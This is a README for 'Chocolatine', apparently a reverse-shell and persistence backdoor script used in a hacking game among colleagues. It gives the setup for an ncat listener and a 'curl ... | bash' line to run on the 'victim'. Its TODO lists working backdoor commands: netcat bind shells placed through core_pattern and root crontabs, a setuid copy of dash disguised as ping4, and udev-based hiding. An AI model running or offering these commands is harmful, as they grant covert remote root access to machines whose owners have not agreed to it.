# Chocolatine :bread: :cookie: :doughnut:

## How to configure and use
You have to edit these lines with your IP, PORT and METHOD
```bash
LHOST="192.168.1.19"
LPORT="4242"
LMTHD="--udp"
```
The Attacker needs to open a listening connection with ncat
```bash
Attacker : ncat --udp -lvp 4242
```
Then you only have to run the following command on your victim
```bash
Victim   : curl http://example.com/chocolatine.sh|bash
```

## Rules
 - No lies
 - No backdoor in an internal git script
 - No network attack (MITM ...)
 - No word macro
 - No keylogger
 - No spoof mail
 - No personal datas, no leak !
 - No Deny of Service (if there is one, you need to pay the croissant)
 - After 7 days of tries, you will remove your backdoor
 - You won't recover any PLAIN passwords    
:warning: If there is a challenge, none of the above applied !


## TODO
 - :x: Fish Shell (~/.config/fish/config.fish)
 - :x: Alias rewrite
 - :x: Core Pattern :   echo '|/bin/nc.traditional -l -p 31337 -e /bin/sh' | sudo tee /proc/sys/kernel/core_pattern
   gedit & kill -SEGV %%
 - :x: Crontab :  for u in root games mysql; do sudo crontab -e -u $u; done
  5 * * * * /bin/nc.traditional -l -p 31337 -e /bin/sh
  /etc/cron.hourly/ and /etc/cron.d/.
 - :x: Suid Dash :o sudo cp /bin/dash /bin/ping4 && sudo chmod u+s /bin/ping4
 - :x: /etc/udev/rules.d or better /lib/udev/rules.d/. UDEV Hide

## Links
 - https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/
 - http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html
 - http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/
